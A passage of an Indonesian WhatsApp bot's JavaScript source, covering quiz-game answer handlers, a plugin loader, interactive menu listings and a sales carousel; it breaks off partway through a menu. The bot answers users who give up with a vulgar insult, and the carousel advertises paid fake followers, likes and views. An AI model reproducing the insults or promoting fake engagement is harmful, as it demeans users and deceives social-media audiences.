m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete susunkata[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete susunkata[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
if (similarity(m.text, userdb.jawaban) >= threshold) return m.reply("*Hampir benar. . .*")
}

// GAME CAK LONTONG 
if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete caklontong[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete caklontong[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME KUIS MATH 
if ((from in kuismath)) {
let { soal, jawaban, hadiah, waktu } = kuismath[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete kuismath[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete kuismath[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME FAMILY 100 
if ((from in family100)) {
let { soal, jawaban, hadiah, waktu } = family100[from]
for (let i of jawaban){
if (budy.toLowerCase() == "nyerah") {
await m.reply(`*LEMAH BET KNTOL*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 0`);
delete family100[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
let anu = jawaban.indexOf(i)
jawaban.splice(anu, 1)
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban.length < 1 ? 'Selamat semua jawaban sudah tertebak!\ningin bermain lagi? kirim '+prefix+'family100' : 'Jawaban yang belum tertebak: '+jawaban.length}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
clearTimeout(waktu);
delete family100[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}
if (jawaban.length < 1){
clearTimeout(waktu);
delete family100[from];
}
}
        
const Reply = async (teks) => {
return Ditss.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By *AlfreadRorw*`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qkontak})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Ditss.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*ᴀʟꜰʀᴇᴀᴅ Official* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*ᴀʟꜰʀᴇᴀᴅ Official Menyediakan 🌟*

* Vps Digital Ocean 2GB - 16GB
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup  Bebas Promosi 1 :*
https://chat.whatsapp.com/Lue3cXuHlIfDSccEWKi7AP
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VakO7HhEVccDSnbpXY1k`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Vps Digital Ocean🌟*

_*Promo Vps Digital Ocean*_
* Ram 2 Core 2 Rp 25.000
* Ram 4 Core 2 Rp 35.000
* Ram 8 Core 4 Rp 45.000
* Ram 16 Core 4 Rp 55.000
𝘽𝙚𝙣𝙚𝙛𝙞𝙩
>̶>̶ Free Install Panel Pterodactyl
>̶>̶ Free Install Nodes+Wings
>̶>̶ Free Req domain
>̶>̶ Free Req Os, Versi, Region
>̶>̶ Full Akses Vps
>̶>̶ Masa Aktif 30 Hari Garansi 25 Hari
>̶>̶ Free Install Thema 8-16 Ram`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Ditss.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}
//btas
//mk
/*if (isCmd) {
     /* console.log(command)
     if (body.match(prefix)) {//drs
        if (m.text.startsWith(prefix)) {
            if (!m.fromMe) {
            const viuc = await getcomandces(command);
                if (body.length === 1) return;
                 if (!command || viuc === "none") return spawndidyou(command)
                 if (isBanned) return reply("*`[ Gumdramon ] tidak bisa mengakses bot`*")
                // Ditss.sendPresenceUpdate(jd, m.chat)
                userdb.hitcmd += 1;          
            } else {
            const viuc2 = await getcomandces(command);
                if (body.length === 1) return;
                 if (!command || viuc2 === "none") return spawndidyou(command)
                  if (isBanned) return reply("*`[ Gumdramon ] tidak bisa mengakses bot`*")
                 //Ditss.sendPresenceUpdate(jd, m.chat)
                userdb.hitcmd += 1;  
            }
        }
    // }
} else {
}*/

//kontol 
const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const skyzodev = { Ditss, toIDR, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, sleep, botNumber, nomore, qkontak, asumaSaldo, ditsganteng, prefix, reply, text, pickRandom, readmore, fetchJson, salam, totalfitur, ppuser, fsaluran, makeid}
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, skyzodev)
}
}
if (!pluginsDisable) return

//============= [ COMMANDS ] ====================================================

switch (command) {

case 'menu': {
Ditss.sendMessage(m.key.remoteJid, {
  text: `Kilck Button List`, 
  footer: `𝙱𝚘𝚝 𝙺𝚢𝚣𝚘 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝟺.𝟶.𝟶`,
  buttons: [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: 'Pemilik Bot'
    },
    type: 1,
  },
  {
    buttonId: '.ping',
    buttonText: {
      displayText: 'Kecepatan Bot'
    },
    type: 1,
  },
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'click here',
        sections: [
          {
            title: 'Kyzo',
            highlight_label: 'Populer',
            rows: [
              {
                header: 'Semua Menu',
                title: 'Tampilkan Semua Fitur Bot',
                description: '',
                id: '.allmenu',
              },
              {
                header: 'Sticker Menu',
                title: 'Tampilkan Fitur Sticker',
                description: '',
                id: '.menu-s',
                },
              {
                header: 'Ai Menu',
                title: 'Tampilkan Fitur Ai',
                description: '',
                id: '.menu-ai',
                },
              {
                header: 'Download Menu',
                title: 'Tampilkan Fitur Download',
                description: '',
                id: '.menu-down',
                },
              {
                header: 'Game & Fun Menu',
                title: 'Tampilkan Fitur Game & Fun',
                description: '',
                id: '.menu-gem',
                },
              {
                header: 'Group Menu',
                title: 'Tampilkan Fitur Group',
                description: '',
                id: '.menu-gc',
                },
              {
                header: 'Owner Menu',
                title: 'Tampilkan Fitur Owner',
                description: '',
                id: '.menu-o',
                },
              {
                header: 'Create Panel Menu',
                title: 'Tampilkan Fitur Create Panel',
                description: '',
                id: '.menu-cp',
              },
            ],
          },
        ],
      }),
    },
  },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}
//D|ts si pler 🐎
break
case 'allmenu': {
Ditss.sendMessage(m.key.remoteJid, {
  text: `*\`乂 I N F O - U S E R 乂\`*
> • *name* : ${m.pushName}
> • *Number :* ${m.sender.split("@")[0]}
> • *Status :* \`${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}\`
> • *total pengguna :*  ${Object.keys(db.users).length}
> • total fitur:* ${totalfitur}
> • *device:* \`${m.device}\`

𝐊𝐲𝐳𝐨 𝐁𝐨𝐭 𝐒𝐢𝐦𝐩𝐥𝐞

「 *S U B - M E N U* 」

> ╭──────────]
> │𝗦𝘁𝗶𝗰𝗸𝗲𝗿 𝗠𝗲𝗻𝘂
> │ .brat <text>
> │ .qc <text>
> │ .stiker <reply foto>
> │ .emojimix
> │ .toimg <reply sticker>
> ╰──────────]
> ╭──────────]
> │𝗔𝗶 𝗠𝗲𝗻𝘂
> │ .aiv <ask>
> │ .hd <reply foto>
> │ .bigjpg <reply foto>
> ╰──────────]
> ╭──────────]
> │𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗠𝗲𝗻𝘂
> │ .ytmp3 <judul>
> │ .ytvid <judul>
> │ .tiktok <link>
> │ .mediafire <link>
> │ .instagram <link>
> ╰──────────]
> ╭──────────]
> │𝗚𝗮𝗺𝗲 & 𝗙𝘂𝗻 𝗠𝗲𝗻𝘂
> │ .tebakgambar
> │ .tebakkata
> │ .tebaklagu
> │ .tebakkalimat
> │ .tebakkabupaten
> │ .tebakkimia
> │ .tebakanime
> │ .tebaklirik
> │ .tebakbendera
> │ .kuis
> │ .susunkata
> │ .asaotak
> │ .caklontong
> │ .siapakahaku
> │ .math
> │ .family100
> │ .jodoh
> ╰──────────]
> ╭──────────]
> │𝗚𝗿𝗼𝘂𝗽 Menu
> │ .on/off
> │ .kick
> │ .open
> │ .close
> │ .on 5
> │ .add
> │ .afk
> │ .demote
> │ .promote
> │ .opentime
> │ .closetime
> │ .linkgc
> │ .hidetag
> │ .tagall
> │ .resetlink
> ╰──────────]
> ╭──────────]
> │ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂
> │ .kudetagc
> │ .joinch
> │ .get
> │ .join
> │ .setppbot
> │ .ping
> ╰──────────]
> ╭──────────]
> │ 𝗖𝗽𝗮𝗻𝗲𝗹 𝗠𝗲𝗻𝘂
> │ .addseller
> │ .listpanel
> │ .listadmin
> │ .delpanel
> │ .deladmin
> │ .cadmin
> │ .1gb
> │ .2gb
> │ .3gb
> │ .4gb
> │ .5gb
> │ .6gb
> │ .7gb
> │ .8gb
> │ .9gb
> │ .10gb
> │ .unli
> ╰──────────]
`, 
  footer: `𝙱𝚘𝚝 𝙺𝚢𝚣𝚘 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝟺.𝟶.𝟶`,
  buttons: [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: 'Pemilik Bot'
    },
    type: 1,
  },
  {
    buttonId: '.ping',
    buttonText: {
      displayText: 'Kecepatan Bot'
    },
    type: 1,
  },
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'click here',
        sections: [
          {
            title: 'Kyzo',
            highlight_label: 'Populer',
            rows: [
              {
                header: 'Semua Menu',
                title: 'Tampilkan Semua Fitur Bot',
                description: '',
                id: '.allmenu',
              },
              {
                header: 'Sticker Menu',
                title: 'Tampilkan Fitur Sticker',
                description: '',
                id: '.menu-s',
                },
              {
                header: 'Ai Menu',
                title: 'Tampilkan Fitur Ai',
                description: '',
                id: '.menu-ai',
                },
              {
                header: 'Download Menu',
                title: 'Tampilkan Fitur Download',
                description: '',
                id: '.menu-down',
                },
              {
                header: 'Game & Fun Menu',
                title: 'Tampilkan Fitur Game & Fun',
                description: '',
                id: '.menu-gem',
                },
              {
                header: 'Group Menu',
                title: 'Tampilkan Fitur Group',
                description: '',
                id: '.menu-gc',
                },
              {
                header: 'Owner Menu',
                title: 'Tampilkan Fitur Owner',
                description: '',
                id: '.menu-o',
                },
              {
                header: 'Create Panel Menu',
                title: 'Tampilkan Fitur Create Panel',
                description: '',
                id: '.menu-cp',
              },
            ],
          },
        ],
      }),
    },
  },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}
//D|ts si pler 🐎
break
case 'menu-s': {
Ditss.sendMessage(m.key.remoteJid, {
  text: `*\`乂 I N F O - U S E R 乂\`*
> • *name* : ${m.pushName}
> • *Number :* ${m.sender.split("@")[0]}
> • *Status :* \`${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}\`
> • *total pengguna :*  ${Object.keys(db.users).length}
> • total fitur:* ${totalfitur}
> • *device:* \`${m.device}\`

𝐊𝐲𝐳𝐨 𝐁𝐨𝐭 𝐒𝐢𝐦𝐩𝐥𝐞

「 *S U B - M E N U* 」

> ╭──────────]
> │𝗦𝘁𝗶𝗰𝗸𝗲𝗿 𝗠𝗲𝗻𝘂
> │ .brat <text>
> │ .qc <text>
> │ .stiker <reply foto>
> │ .emojimix
> │ .toimg <reply sticker>
> ╰──────────]
`, 
  footer: `𝙱𝚘𝚝 𝙺𝚢𝚣𝚘 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝟺.𝟶.𝟶`,
  buttons: [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: 'Pemilik Bot'
    },
    type: 1,
  },
  {
    buttonId: '.ping',
    buttonText: {
      displayText: 'Kecepatan Bot'
    },
    type: 1,
  },
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'click here',
        sections: [
          {
            title: 'Kyzo',
            highlight_label: 'Populer',
            rows: [
              {
                header: 'Semua Menu',
                title: 'Tampilkan Semua Fitur Bot',
                description: '',
                id: '.allmenu',
              },
              {
                header: 'Sticker Menu',
                title: 'Tampilkan Fitur Sticker',
                description: '',
                id: '.menu-s',
                },
              {
                header: 'Ai Menu',
                title: 'Tampilkan Fitur Ai',
                description: '',
                id: '.menu-ai',
                },
              {
                header: 'Download Menu',
                title: 'Tampilkan Fitur Download',
                description: '',
                id: '.menu-down',
                },
              {
                header: 'Game & Fun Menu',
                title: 'Tampilkan Fitur Game & Fun',
                description: '',
                id: '.menu-gem',
                },
              {
                header: 'Group Menu',
                title: 'Tampilkan Fitur Group',
                description: '',
                id: '.menu-gc',
                },
              {
                header: 'Owner Menu',
                title: 'Tampilkan Fitur Owner',
                description: '',
                id: '.menu-o',
                },
              {
                header: 'Create Panel Menu',
                title: 'Tampilkan Fitur Create Panel',
                description: '',
                id: '.menu-cp',
              },
            ],
          },
        ],
      }),
    },
  },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}
//D|ts si pler 🐎
break
case 'menu-ai': {
Ditss.sendMessage(m.key.remoteJid, {
  text: `*\`乂 I N F O - U S E R 乂\`*
> • *name* : ${m.pushName}
> • *Number :* ${m.sender.split("@")[0]}
> • *Status :* \`${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}\`
> • *total pengguna :*  ${Object.keys(db.users).length}
> • total fitur:* ${totalfitur}
> • *device:* \`${m.device}\`

𝐊𝐲𝐳𝐨 𝐁𝐨𝐭 𝐒𝐢𝐦𝐩𝐥𝐞

「 *S U B - M E N U* 」

> ╭──────────]
> │𝗔𝗶 𝗠𝗲𝗻𝘂
> │ .aiv <ask>
> │ .hd <reply foto>
> │ .bigjpg <reply foto>
> ╰──────────]
`, 
  footer: `𝙱𝚘𝚝 𝙺𝚢𝚣𝚘 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝟺.𝟶.𝟶`,
  buttons: [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: 'Pemilik Bot'
    },
    type: 1,
  },
  {
    buttonId: '.ping',
    buttonText: {
      displayText: 'Kecepatan Bot'
    },
    type: 1,
  },
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'click here',
        sections: [
          {
            title: 'Kyzo',
            highlight_label: 'Populer',
            rows: [
              {
                header: 'Semua Menu',
                title: 'Tampilkan Semua Fitur Bot',
                description: '',
                id: '.allmenu',
              },
              {
                header: 'Sticker Menu',
                title: 'Tampilkan Fitur Sticker',
                description: '',
                id: '.menu-s',
                },
              {
                header: 'Ai Menu',
                title: 'Tampilkan Fitur Ai',
                description: '',
                id: '.menu-ai',
                },
              {
                header: 'Download Menu',
                title: 'Tampilkan Fitur Download',
                description: '',
                id: '.menu-down',
                },
              {
                header: 'Game & Fun Menu',
                title: 'Tampilkan Fitur Game & Fun',
                description: '',
                id: '.menu-gem',
                },
              {
                header: 'Group Menu',
                title: 'Tampilkan Fitur Group',
                description: '',
                id: '.menu-gc',
                },
              {
                header: 'Owner Menu',
                title: 'Tampilkan Fitur Owner',
                description: '',
                id: '.menu-o',
                },
              {
                header: 'Create Panel Menu',
                title: 'Tampilkan Fitur Create Panel',
                description: '',
                id: '.menu-cp',
              },
            ],
          },
        ],
      }),
    },
  },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}
//D|ts si pler 🐎
break
case 'menu-down': {
Ditss.sendMessage(m.key.remoteJid, {
  text: `*\`乂 I N F O - U S E R 乂\`*
> • *name* : ${m.pushName}
> • *Number :* ${m.sender.split("@")[0]}
> • *Status :* \`${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}\`
> • *total pengguna :*  ${Object.keys(db.users).length}
> • total fitur:* ${totalfitur}
> • *device:* \`${m.device}\`

𝐊𝐲𝐳𝐨 𝐁𝐨𝐭 𝐒𝐢𝐦𝐩𝐥𝐞

「 *S U B - M E N U* 」

> ╭──────────]
> │𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗠𝗲𝗻𝘂
> │ .ytmp3 <judul>
> │ .ytvid <judul>
> │ .tiktok <link>
> │ .mediafire <link>
> │ .instagram <link>
> ╰──────────]`, 
  footer: `𝙱𝚘𝚝 𝙺𝚢𝚣𝚘 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝟺.𝟶.𝟶`,
  buttons: [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: 'Pemilik Bot'
    },
    type: 1,
  },
  {
    buttonId: '.ping',
    buttonText: {
      displayText: 'Kecepatan Bot'
    },
    type: 1,
  },
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'click here',
        sections: [
          {
            title: 'Kyzo',
            highlight_label: 'Populer',
            rows: [
              {
                header: 'Semua Menu',
                title: 'Tampilkan Semua Fitur Bot',
                description: '',
                id: '.allmenu',
              },
              {
                header: 'Sticker Menu',
                title: 'Tampilkan Fitur Sticker',
                description: '',
                id: '.menu-s',
                },
              {
                header: 'Ai Menu',
                title: 'Tampilkan Fitur Ai',
                description: '',
                id: '.menu-ai',
                },
              {
                header: 'Download Menu',
                title: 'Tampilkan Fitur Download',
                description: '',
                id: '.menu-down',
                },
              {
                header: 'Game & Fun Menu',
                title: 'Tampilkan Fitur Game & Fun',
                description: '',
                id: '.menu-gem',
                },
              {
                header: 'Group Menu',
                title: 'Tampilkan Fitur Group',
                description: '',
                id: '.menu-gc',
                },
              {
                header: 'Owner Menu',
                title: 'Tampilkan Fitur Owner',
                description: '',
                id: '.menu-o',
                },
              {
                header: 'Create Panel Menu',
                title: 'Tampilkan Fitur Create Panel',
                description: '',
                id: '.menu-cp',
              },
            ],
          },
        ],
      }),
    },
  },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}
//D|ts si pler 🐎
break
case 'menu-gem': {
Ditss.sendMessage(m.key.remoteJid, {
  text: `*\`乂 I N F O - U S E R 乂\`*
> • *name* : ${m.pushName}
> • *Number :* ${m.sender.split("@")[0]}
> • *Status :* \`${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}\`
> • *total pengguna :*  ${Object.keys(db.users).length}
> • total fitur:* ${totalfitur}
> • *device:* \`${m.device}\`

𝐊𝐲𝐳𝐨 𝐁𝐨𝐭 𝐒𝐢𝐦𝐩𝐥𝐞

「 *S U B - M E N U* 」

> ╭──────────]
> │𝗚𝗮𝗺𝗲 & 𝗙𝘂𝗻 𝗠𝗲𝗻𝘂
> │ .tebakgambar
> │ .tebakkata
> │ .tebaklagu
> │ .tebakkalimat
> │ .tebakkabupaten
> │ .tebakkimia
> │ .tebakanime
> │ .tebaklirik
> │ .tebakbendera
> │ .kuis
> │ .susunkata
> │ .asaotak
> │ .caklontong
> │ .siapakahaku
> │ .math
> │ .family100
> │ .jodoh
> ╰──────────]`, 
  footer: `𝙱𝚘𝚝 𝙺𝚢𝚣𝚘 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝟺.𝟶.𝟶`,
  buttons: [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: 'Pemilik Bot'
    },
    type: 1,
  },
  {
    buttonId: '.ping',
    buttonText: {
      displayText: 'Kecepatan Bot'
    },
    type: 1,
  },
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'click here',
        sections: [
          {
            title: 'Kyzo',
            highlight_label: 'Populer',
            rows: [
              {
                header: 'Semua Menu',
                title: 'Tampilkan Semua Fitur Bot',
                description: '',
                id: '.allmenu',
              },
              {
                header: 'Sticker Menu',
                title: 'Tampilkan Fitur Sticker',
                description: '',
                id: '.menu-s',
                },
              {
                header: 'Ai Menu',
                title: 'Tampilkan Fitur Ai',
                description: '',
                id: '.menu-ai',
                },
              {
                header: 'Download Menu',
                title: 'Tampilkan Fitur Download',
                description: '',
                id: '.menu-down',
                },
              {
                header: 'Game & Fun Menu',
                title: 'Tampilkan Fitur Game & Fun',
                description: '',
                id: '.menu-gem',
                },
              {
                header: 'Group Menu',
                title: 'Tampilkan Fitur Group',
                description: '',
                id: '.menu-gc',
                },
              {
                header: 'Owner Menu',
                title: 'Tampilkan Fitur Owner',
                description: '',
                id: '.menu-o',
                },
              {
                header: 'Create Panel Menu',
                title: 'Tampilkan Fitur Create Panel',
                description: '',
                id: '.menu-cp',
              },
            ],
          },
        ],
      }),
    },
  },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}
//D|ts si pler 🐎
break
case 'menu-gc': {
Ditss.sendMessage(m.key.remoteJid, {
  text: `*\`乂 I N F O - U S E R 乂\`*
> • *name* : ${m.pushName}
> • *Number :* ${m.sender.split("@")[0]}
> • *Status :* \`${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}\`
> • *total pengguna :*  ${Object.keys(db.users).length}
> • total fitur:* ${totalfitur}
> • *device:* \`${m.device}\`

𝐊𝐲𝐳𝐨 𝐁𝐨𝐭 𝐒𝐢𝐦𝐩𝐥𝐞

「 *S U B - M E N U* 」

> ╭──────────]
> │𝗚𝗿𝗼𝘂𝗽 Menu
> │ .on/off
> │ .kick
> │ .open
> │ .close
> │ .on 5
> │ .add
> │ .afk
> │ .demote
> │ .promote
> │ .opentime
> │ .closetime
> │ .linkgc
> │ .hidetag
> │ .tagall
> │ .resetlink
> ╰──────────]`, 
  footer: `𝙱𝚘𝚝 𝙺𝚢𝚣𝚘 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝟺.𝟶.𝟶`,
  buttons: [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: 'Pemilik Bot'
    },
    type: 1,
  },
  {
    buttonId: '.ping',
    buttonText: {
      displayText: 'Kecepatan Bot'
    },
    type: 1,
  },
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'click here',
        sections: [
          {
            title: 'Kyzo',
            highlight_label: 'Populer',
            rows: [
              {
                header: 'Semua Menu',
                title: 'Tampilkan Semua Fitur Bot',
                description: '',
                id: '.allmenu',
              },
              {
                header: 'Sticker Menu',
                title: 'Tampilkan Fitur Sticker',
                description: '',
                id: '.menu-s',
                },
              {
                header: 'Ai Menu',
                title: 'Tampilkan Fitur Ai',
                description: '',
                id: '.menu-ai',
                },
              {
                header: 'Download Menu',
                title: 'Tampilkan Fitur Download',
                description: '',
                id: '.menu-down',
                },
              {
                header: 'Game & Fun Menu',
                title: 'Tampilkan Fitur Game & Fun',
                description: '',
                id: '.menu-gem',
                },
              {
                header: 'Group Menu',
                title: 'Tampilkan Fitur Group',
                description: '',
                id: '.menu-gc',
                },
              {
                header: 'Owner Menu',
                title: 'Tampilkan Fitur Owner',
                description: '',
                id: '.menu-o',
                },
              {
                header: 'Create Panel Menu',
                title: 'Tampilkan Fitur Create Panel',
                description: '',
                id: '.menu-cp',
              },
            ],
          },
        ],
      }),
    },
  },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}
//D|ts si pler 🐎
break
case 'menu-o': {
Ditss.sendMessage(m.key.remoteJid, {
  text: `*\`乂 I N F O - U S E R 乂\`*
> • *name* : ${m.pushName}
> • *Number :* ${m.sender.split("@")[0]}
> • *Status :* \`${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}\`
> • *total pengguna :*  ${Object.keys(db.users).length}
> • total fitur:* ${totalfitur}
> • *device:* \`${m.device}\`

𝐊𝐲𝐳𝐨 𝐁𝐨𝐭 𝐒𝐢𝐦𝐩𝐥𝐞

「 *S U B - M E N U* 」

> ╭──────────]
> │ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂
> │ .kudetagc
> │ .joinch
> │ .get
> │ .join
> │ .setppbot
> │ .ping
> ╰──────────]`, 
  footer: `𝙱𝚘𝚝 𝙺𝚢𝚣𝚘 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝟺.𝟶.𝟶`,
  buttons: [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: 'Pemilik Bot'
    },
    type: 1,
  },
  {
    buttonId: '.ping',
    buttonText: {
      displayText: 'Kecepatan Bot'
    },
    type: 1,
  },
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'click here',
        sections: [
          {
            title: 'Kyzo',
            highlight_label: 'Populer',
            rows: [
              {
                header: 'Semua Menu',
